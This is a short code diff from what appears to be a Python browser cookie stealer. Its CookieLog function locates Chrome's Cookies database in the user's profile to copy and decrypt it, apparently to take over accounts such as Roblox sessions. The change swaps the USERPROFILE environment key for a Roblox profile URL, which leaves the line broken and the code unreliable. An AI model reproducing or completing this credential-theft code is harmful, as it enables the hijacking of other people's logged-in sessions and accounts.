@@ -49,7 +49,7 @@ def decrypt_data(data, key):
 
 
 def CookieLog():
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+    db_path = os.path.join(os.environ["https://www.roblox.com/users/2647278229/profile"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
     filename = "Cookies.db"
     if not os.path.isfile(filename):
